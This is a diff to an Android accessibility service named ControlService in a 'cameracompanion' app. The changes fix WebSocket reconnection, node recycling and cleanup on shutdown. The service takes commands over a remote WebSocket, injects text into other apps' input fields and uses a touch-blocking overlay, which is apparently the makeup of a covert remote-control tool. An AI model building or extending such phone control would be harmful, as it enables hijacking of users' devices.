@@ -2,7 +2,6 @@ package com.artem.cameracompanion
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
-import android.annotation.SuppressLint
 import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.Path
@@ -79,10 +78,12 @@ class ControlService : AccessibilityService() {
                     try { handleMessage(JSONObject(text)) } catch (_: Exception) {}
                 }
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
-                    wsControl = null; ctrlHandler.postDelayed({ connectControlWs() }, 5000)
+                    wsControl = null
+                    if (instance != null) ctrlHandler.postDelayed({ if (instance != null) connectControlWs() }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
-                    wsControl = null; ctrlHandler.postDelayed({ connectControlWs() }, 5000)
+                    wsControl = null
+                    if (instance != null) ctrlHandler.postDelayed({ if (instance != null) connectControlWs() }, 5000)
                 }
             })
     }
@@ -206,11 +207,13 @@ class ControlService : AccessibilityService() {
 
     private fun typeText(text: String) {
         val node = rootInActiveWindow ?: return
-        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT) ?: node
+        val focused = node.findFocus(android.view.accessibility.AccessibilityNodeInfo.FOCUS_INPUT)
+        val target = focused ?: node
         val args = Bundle()
         args.putCharSequence(android.view.accessibility.AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
-        focused.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
-        try { focused.recycle() } catch (_: Exception) {}
+        target.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+        // recycle focused only if it's a different object from node
+        if (focused != null) try { focused.recycle() } catch (_: Exception) {}
         try { node.recycle() } catch (_: Exception) {}
     }
 
@@ -251,6 +254,8 @@ class ControlService : AccessibilityService() {
         hideTouchBlockOverlay()
         wsControl?.close(1000, "stopped"); wsControl = null
         screenExecutor.shutdown()
+        try { http.dispatcher.executorService.shutdown() } catch (_: Exception) {}
+        try { http.connectionPool.evictAll() } catch (_: Exception) {}
         return super.onUnbind(intent)
     }
 }
